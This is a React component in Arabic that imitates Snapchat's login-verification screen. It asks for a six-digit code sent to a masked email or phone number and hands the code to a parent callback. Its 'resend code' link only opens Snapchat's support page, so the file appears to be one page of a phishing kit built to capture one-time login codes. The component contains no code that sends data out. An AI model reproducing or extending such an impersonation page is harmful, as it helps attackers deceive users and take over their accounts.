import { useState } from 'react';

interface LoginVerificationProps {
  identifier: string;
  onSubmit: (code: string) => void;
  onBack: () => void;
}

const inputStyle: React.CSSProperties = {
  width: '100%',
  padding: '0.75rem 1rem',
  border: '2px solid #e5e7eb',
  borderRadius: '0.5rem',
  textAlign: 'center',
  fontSize: '1.125rem',
  letterSpacing: '0.1em',
  fontFamily: 'monospace',
  transition: 'border-color 0.2s',
};

export default function LoginVerification({ identifier, onSubmit, onBack }: LoginVerificationProps) {
  const [code, setCode] = useState('');
  const [inputBorder, setInputBorder] = useState('#e5e7eb');
  const [codeError, setCodeError] = useState('');

  const handleSubmit = () => {
    // Validate code - must be exactly 6 digits
    if (code.trim() && code.length !== 6) {
      setCodeError('رمز التأكيد غير صحيح');
      return;
    }
    
    if (code.trim()) {
      setCodeError('');
      onSubmit(code);
    }
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setCode(value);
    // Clear error when user is typing
    if (codeError) {
      setCodeError('');
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleSubmit();
    }
  };

  const maskIdentifier = (id: string) => {
    if (id.includes('@')) {
      const [name, domain] = id.split('@');
      return `${name.substring(0, 3)}***@${domain}`;
    } else if (id.startsWith('+')) {
      return `${id.substring(0, 3)}***${id.substring(id.length - 2)}`;
    } else {
      return `${id.substring(0, 3)}***${id.substring(id.length - 2)}`;
    }
  };

  return (
    <div className="snapchat-container">
      <div className="snapchat-card">
        <h1 className="snapchat-title">أكد أن ذلك هو أنت</h1>
        
        <div className="snapchat-user-display">
          <div className="snapchat-user-label">هل هذا ليس أنت؟</div>
          <div className="snapchat-user-value">{maskIdentifier(identifier)}</div>
        </div>

        <div className="verification-helper">
          يرجى إدخال الرمز المرسل إلى<br />
          <span className="font-semibold">{maskIdentifier(identifier)}</span>
        </div>

        <div className="mb-6">
          <label className="snapchat-subtitle">إدخال الرمز</label>
          <input
            type="text"
            style={{ ...inputStyle, borderColor: inputBorder }}
            value={code}
            onChange={handleCodeChange}
            onKeyPress={handleKeyPress}
            onFocus={() => setInputBorder('#3b82f6')}
            onBlur={() => setInputBorder('#e5e7eb')}
            placeholder=""
            maxLength={6}
          />
          {codeError && (
            <div style={{ color: '#dc2626', fontSize: '0.875rem', marginTop: '0.5rem', textAlign: 'right' }}>
              {codeError}
            </div>
          )}
        </div>

        <div className="verification-actions">
          <a href="https://www.snapchat.com/support" target="_blank" rel="noopener noreferrer" className="snapchat-link">
            إعادة إرسال الرمز
          </a>
          <span className="text-gray-400">/</span>
          <a href="https://www.snapchat.com/support" target="_blank" rel="noopener noreferrer" className="snapchat-link">
            هل تحتاج إلى مساعدة؟
          </a>
        </div>

        <button
          onClick={handleSubmit}
          className="snapchat-button w-full"
          disabled={!code.trim()}
        >
          التالي
        </button>

        <div className="text-center mt-6">
          <button
            onClick={onBack}
            className="snapchat-link"
          >
            العودة
          </button>
        </div>
      </div>
    </div>
  );
}
